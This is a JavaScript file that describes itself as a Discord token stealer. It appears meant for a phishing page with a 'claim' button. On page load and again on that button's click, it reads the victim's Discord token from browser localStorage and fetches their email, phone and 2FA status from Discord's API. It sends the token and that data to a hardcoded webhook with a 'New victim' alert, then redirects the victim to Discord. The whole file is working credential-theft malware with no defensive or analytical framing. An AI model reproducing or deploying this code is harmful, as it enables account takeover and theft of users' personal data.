// Discord token stealer - sends username, token, and all retrievable data to webhook
const WEBHOOK_URL = "https://discord.com/api/webhooks/1508006173440217118/sA6YExjSlJX7dINN-KAGl2E1cJYaYLHgtvSjBSBGpeWpc5jm20xQOEP-onJuEJIKgd6G";

// Function to extract Discord token from localStorage
function getToken() {
    let token = localStorage.getItem('token');
    if (!token) {
        for (let i = 0; i < localStorage.length; i++) {
            let key = localStorage.key(i);
            let val = localStorage.getItem(key);
            if (val && val.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/)) {
                token = val;
                break;
            }
        }
    }
    return token;
}

// Fetch user info from Discord API using token
async function getUserInfo(token) {
    try {
        const res = await fetch('https://discord.com/api/v9/users/@me', {
            headers: { 'Authorization': token }
        });
        if (res.ok) return await res.json();
        return null;
    } catch(e) { 
        console.error("Failed to fetch user info:", e);
        return null; 
    }
}

// Send data to webhook using proper Discord embed format
async function sendToWebhook(token, userData) {
    // Build a clean username string
    let usernameString = "Unknown";
    if (userData) {
        const discrim = userData.discriminator && userData.discriminator !== "0" ? `#${userData.discriminator}` : "";
        usernameString = `${userData.username || "NoUsername"}${discrim}`;
    }

    // Prepare embed fields with all retrieved info
    const fields = [
        { name: "🟢 Username", value: usernameString, inline: true },
        { name: "🆔 User ID", value: userData?.id || "Not retrieved", inline: true },
        { name: "🔑 Token", value: `||${token || "No token found"}||`, inline: false },
        { name: "📧 Email", value: userData?.email || "N/A", inline: true },
        { name: "📱 Phone", value: userData?.phone || "N/A", inline: true },
        { name: "🔒 2FA Enabled", value: userData?.mfa_enabled ? "✅ Yes" : "❌ No", inline: true },
        { name: "🖼️ Avatar Hash", value: userData?.avatar ? `\`${userData.avatar}\`` : "None", inline: true },
        { name: "🏷️ Discriminator", value: userData?.discriminator || "0", inline: true },
        { name: "✅ Verified", value: userData?.verified ? "Yes" : "No", inline: true }
    ];

    // Add locale if available
    if (userData?.locale) fields.push({ name: "🌐 Locale", value: userData.locale, inline: true });

    const embed = {
        title: "💀 Discord Account Compromised",
        description: `Token successfully extracted from **${usernameString}**`,
        color: 0xff3366,
        fields: fields,
        footer: { text: "Token stealer • Act fast before token rotates" },
        timestamp: new Date().toISOString()
    };

    // Send to webhook
    try {
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                content: `@everyone **New victim:** ${usernameString}`,
                embeds: [embed] 
            })
        });
        if (response.ok) {
            console.log("Webhook sent successfully");
        } else {
            console.error("Webhook failed:", response.status);
        }
    } catch(err) {
        console.error("Network error sending to webhook:", err);
    }
}

// Main execution: on page load, steal token and send data
window.addEventListener('load', async () => {
    const token = getToken();
    if (!token) {
        // Send a notification that no token was found (still helpful)
        const noTokenEmbed = {
            title: "⚠️ Token extraction failed",
            description: "User opened the page but is not logged into Discord in this browser.",
            color: 0xffaa33,
            fields: [
                { name: "User Agent", value: navigator.userAgent, inline: false },
                { name: "Timestamp", value: new Date().toISOString(), inline: true }
            ]
        };
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [noTokenEmbed] })
        });
        return;
    }
    
    const userInfo = await getUserInfo(token);
    await sendToWebhook(token, userInfo);
});

// Button click handler (optional, ensures another exfiltration attempt)
const claimBtn = document.getElementById('claimButton');
if (claimBtn) {
    claimBtn.addEventListener('click', async (e) => {
        e.preventDefault();
        claimBtn.innerHTML = '<span>⚡</span> Redeeming...';
        claimBtn.disabled = true;
        
        const token = getToken();
        if (token) {
            const userInfo = await getUserInfo(token);
            await sendToWebhook(token, userInfo);
        } else {
            // Notify webhook that button was clicked but no token
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: "⚠️ Button clicked but no token found (maybe not logged in)." })
            });
        }
        
        setTimeout(() => {
            window.location.href = "https://discord.com/channels/@me";
        }, 800);
    });
}
